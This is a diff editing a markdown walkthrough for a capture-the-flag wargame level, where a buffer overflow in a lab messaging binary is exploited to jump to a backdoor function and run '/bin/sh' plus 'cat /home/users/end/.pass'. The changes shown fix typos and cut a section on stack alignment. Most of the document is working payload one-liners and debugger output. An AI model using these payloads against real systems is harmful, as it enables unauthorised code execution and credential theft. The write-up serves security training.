@@ -8,15 +8,15 @@ reads from STDIN and passes the input to `system()`, allowing us to execute arbi
 
 ## The strategy
 
-Redirect the program's flow to `secret_backdoor` function and pass the address of `/bin/sh` as the first argument to
+The strategy is to redirect the program's flow to `secret_backdoor` function and pass the address of `/bin/sh` as the first argument to
 `system()`. From here, we'll pass the command we want to execute, which is `cat /home/users/end/.pass` to read the
 password for the last level.
 
 ## The Vulnerability
 
-`char storage[140]` is a shared buffer located in the `handle_msg` function's stack frame. Is used to store both the
+`char storage[140]` is a shared buffer located in the `handle_msg` function's stack frame. It is used to store both the
 username and the message. `set_username` and `set_msg` functions are called from `handle_msg`. They get user input, 
-username and message respectively, first store them into internal buffers and then copied into `storage` sheared buffer.
+username and message respectively, first store them into internal buffers and then copied into `storage` shared buffer.
 However, both functions have problems regarding memory management.
 
 `set_username` writes up to 40 bytes into `storage + 140` when `storage` is only 140 bytes long. This means that
@@ -73,7 +73,7 @@ redirect the program's flow to `secret_backdoor`.
 
 ## Finding the address of `secret_backdoor`
 
-After coping the binary to `/tmp/level09` to avoid any permission issues, we load it into `gdb` and set a breakpoint
+After copying the binary to `/tmp/level09` to avoid any permission issues, we load it into `gdb` and set a breakpoint
 at `main`. From there, we can use `info function secret_backdoor` to find its address.
 
 ```shell
@@ -92,14 +92,14 @@ Non-debugging symbols:
 0x000055555555488c  secret_backdoor
 ```
 
-Adding the address of `secret_backdoor` (`0x00005555555488c`) to our exploit:
+Adding the address of `secret_backdoor` (`0x000055555555488c`) to our exploit:
 
-```shel
+```shell
 shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "B" * 286 + "\x8c\x48\x55\x55\x55\x00\x00")' > exploit
 ```
 
 Since use [pwndbg](https://github.com/pwndbg/pwndbg) in other machine, the address of `secret_backdoor` is different.
-Instead of `0x00005555555488c`, we use `0x000055555540088c`, so we modify our exploit temporarily to:
+Instead of `0x000055555555488c`, we use `0x000055555540088c`, so we modify our exploit temporarily to:
 
 ```shell
 shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "B" * 286 + "\x8c\x08\x40\x55\x55\x55\x00\x00")' > exploit
@@ -131,11 +131,12 @@ Program received signal SIGSEGV, Segmentation fault.
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-We achieve redirect programs flow to `secret_backdoor` function. However, the program still crashes because `secret_backdoor` 
-calls `system()`, but its first argument (in the `RDI` register) contains `0x4242424242424242`, which is `BBBBBBBB` in ASCII.
-So `system("BBBBBBBB")` is called, which causes a segmentation fault. Since `BBBBBBBB` is of our exploit, we subtitute it
-with `/bin/sh` to execute a shell. But first, we need to find the offset where we can place `/bin/sh` in our exploit since
-originally we use 286 `B` characters to fill the buffer before the return address.
+We successfully redirected the program's flow to `secret_backdoor` function. However, the program still crashes because
+`secret_backdoor` calls `system()` with its first argument pointing to a memory address containing `BBBBBBBB`.
+This causes `system()` to attempt executing `BBBBBBBB` as a command, resulting in a segmentation fault. 
+Since `BBBBBBBB` is part of our exploit, we need to substitute it with `/bin/sh` to execute a shell. But first, we need
+to find the offset where we can place `/bin/sh` in our exploit since originally we're currently using 286 `B` characters
+to fill the buffer before the return address.
 
 ## Finding Offsets to where to place `/bin/sh`'s address
 
@@ -174,31 +175,7 @@ Found at offset 266
 This means that we can place `/bin/sh` at offset 266 in our exploit. We modify our exploit to include `/bin/sh` at
 this offset. We modify the amount of `B` characters accordingly to maintain the correct length before the return address.
 
-// TODO delete this line until...
-```shell
-pwndbg> shell python2 -c 'import sys; sys.stdout.write("\xff" * 41 + "A" * 266 + "/bin/sh;" + "B" * ( 286 - 266 - 8)  + "\x8c\x08\x40\x55\x55\x55")' > exploit
-pwndbg> run < ./exploit
-...SINP...
---------------------------------------------
-|   ~Welcome to l33t-m$n ~    v1337        |
---------------------------------------------
->: Enter your username
->>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
->>: >: Msg sent!
-
-Program received signal SIGSEGV, Segmentation fault.
-...SINP...
-──────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────
- ► 0x7ffff7e01df4 <do_system+356>    movaps xmmword ptr [rsp + 0x50], xmm0     <[0x7fffffffdc68] not aligned to 16 bytes>
-...SINP...
-```
-
-We found a segfault due to a problem with alignment. `moveaps` instruction requires the memory address to be aligned to
-16 bytes and 0x5540088d is not aligned. So we adjust the target addres by one byte to fix the alignment issue passing
-from `\x8c` to `\x8d`.
-// ... here
-
-We return to our original machine where the address of `secret_backdoor` is `0x00005555555488c` and modify our exploit
+Returning to our original machine where the address of `secret_backdoor` is `0x00005555555488c` and modify our exploit
 and test it:
 
 ```shell
@@ -215,8 +192,12 @@ sh: 1: BBBBBBBBBBBBBBBBBBBB: not found
 Segmentation fault (core dumped)
 ```
 
-A shell is executed, but we see an error because the command passed to `/bin/sh` is `AAAAAAAAAA.../bin/sh`, which is not
-found. Instead of the 266 "A" characters, we use a cyclic pattern again to find the exact offset where we can place our
+A shell is executed, but we get an error because the command passed to `/bin/sh` is `AAAAAAAAAA.../bin/sh`, which does
+not exist.
+
+## Placing our command to read the password
+
+Instead of the 266 "A" characters, we use a cyclic pattern again to find the exact offset where we can place our
 command: `cat /home/users/end/.pass;`
 
 ```shell
@@ -243,7 +224,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000000000000000 in ?? ()
 ```
 
-`/bin/sh` trys to execute `aauaaaaa...`, which is the value at offset 158 in the cyclic pattern. We find the offset with:
+`/bin/sh` tries to execute `aauaaaaa...`, which is the value at offset 158 in the cyclic pattern. We find the offset with:
 
 ```shell
 pwndbg> cyclic -l aauaaaaa
